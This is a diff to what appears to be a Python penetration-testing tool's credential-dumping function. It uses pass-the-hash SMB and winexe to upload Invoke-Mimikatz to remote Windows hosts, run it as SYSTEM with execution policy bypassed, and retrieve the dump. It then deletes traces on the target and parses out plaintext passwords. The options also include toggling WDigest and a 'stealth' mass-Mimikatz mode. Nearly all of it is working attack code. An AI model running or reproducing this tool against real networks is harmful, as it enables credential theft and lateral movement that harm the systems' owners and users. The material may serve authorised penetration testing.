@@ -239,25 +239,27 @@ def datadump(user, passw, host, path, os_version):
 					fout.write('Invoke-Mimikatz -DumpCreds > c:\\mimi_creddump.txt\n')
 					fout.write('exit\n')
 					fout.close() 
+					
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put Invoke-Mimikatz.ps1\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
 					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
 						print colored("[+]mimi_creddump.txt file found",'green')
-						if not os.path.isfile('/usr/bin/dos2unix'):
-							print colored("[-]Cannot find dos2unix",'red')
-							exit(1)				
+						if not os.path.isfile('/usr/bin/iconv'):
+							print colored("[-]Cannot find iconv",'red')
+							exit(1)
 						else:
-							print colored("[+]Found dos2unix",'green')
-							os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
-							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
+							print colored("[+]Found iconv",'green')
+							#os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
+							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/mimi_creddump.txt > "+outputpath+host+"/mimi_creddump1.txt")
+							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump1.txt",'yellow')
 							print colored("[+]Basic parsed output:",'green')
 							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
-							os.system("cat "+outputpath+host+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
+							os.system("cat "+outputpath+host+"/mimi_creddump1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 					else:
-						print colored("[-]mimi_creddump.txt file not found",'red')       
+						print colored("[-]mimi_creddump1.txt file not found",'red')       
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
 
@@ -502,17 +504,6 @@ p.add_argument("-r", "--edq_nla", dest="edq_nla", default="n", help="<Optional> 
 p.add_argument("-t", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
 p.add_argument("-W", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
 p.add_argument("-s", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
-
-
-args = p.parse_args()
-
-user = args.username
-passw = args.password
-files = ['sam', 'system', 'security']
-progs = ['cachedump','lsadump']
-
-creddump7path=args.credpath
-
 
 args = p.parse_args()
 
